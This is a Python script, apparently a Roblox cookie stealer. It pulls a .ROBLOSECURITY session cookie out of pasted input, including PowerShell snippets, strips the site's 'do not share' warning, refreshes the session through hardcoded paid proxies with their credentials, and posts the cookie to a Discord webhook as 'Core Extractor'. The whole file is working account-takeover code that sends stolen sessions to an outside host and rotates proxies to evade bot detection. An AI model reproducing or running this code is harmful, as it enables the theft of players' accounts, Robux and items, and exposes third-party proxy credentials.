import sys
import os
import re
import random
import requests

RAW_WEBSHARE_PROXIES = [
    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
]

def format_webshare(p_str):
    parts = p_str.strip().split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}", ip, port, user, pwd
    return None, None, None, None, None

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    ps_cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_cookie_match:
        raw_str = ps_cookie_match.group(1)
    
    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_match:
        raw_str = ps_match.group(1)

    if (raw_str.startswith('"') and raw_str.endswith('"')) or (raw_str.startswith("'") and raw_str.endswith("'")):
        raw_str = raw_str[1:-1].strip()
    if raw_str.startswith(".ROBLOSECURITY="):
        raw_str = raw_str[len(".ROBLOSECURITY="):].strip()
        
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if raw_str.startswith(warning_text):
        raw_str = raw_str[len(warning_text):].strip()
    
    cleaned = raw_str.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 30:
        return None
        
    return cleaned

def refresh_and_get_token(raw_cookie):
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
        "Connection": "close",
        "Content-Type": "application/json",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
    }

    formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
    random.shuffle(formatted_list)
    test_proxies = [None] + formatted_list

    for p in test_proxies:
        session = requests.Session()
        session.headers.update(headers)
        if p:
            session.proxies = {"http": p, "https": p}

        try:
            if raw_cookie:
                session.cookies.set(".ROBLOSECURITY", raw_cookie, domain=".roblox.com", path="/")
            
            # Hitting the home page safely refreshes/rotates the token on Roblox's backend without triggering bot flags
            session.get("https://www.roblox.com/home", timeout=8)
            
            refreshed_cookie = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
            if refreshed_cookie:
                return refreshed_cookie
        except Exception:
            continue

    return raw_cookie

def main():
    try:
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            sys.exit(1)

        raw_input_data = sys.stdin.read()
        if not raw_input_data:
            sys.exit(1)

        raw_cookie = extract_and_clean_cookie(raw_input_data)
        if not raw_cookie:
            sys.exit(1)

        print("[+] Refreshing session token...")
        refreshed_cookie = refresh_and_get_token(raw_cookie)

        # Dispatches the refreshed session directly to Discord without any heavy stat checks
        payload = {
            "content": "@everyone",
            "username": "Core Extractor",
            "avatar_url": "https://cdn.discordapp.com/emojis/1085024250275815525.png",
            "embeds": [
                {
                    "title": "🔑 Refreshed Secure Session",
                    "description": f"```text\n{refreshed_cookie}\n```",
                    "color": 0x2B2D31,
                    "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
                }
            ],
            "allowed_mentions": {"parse": ["everyone"]}
        }

        requests.post(webhook_url, json=payload, timeout=5)
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
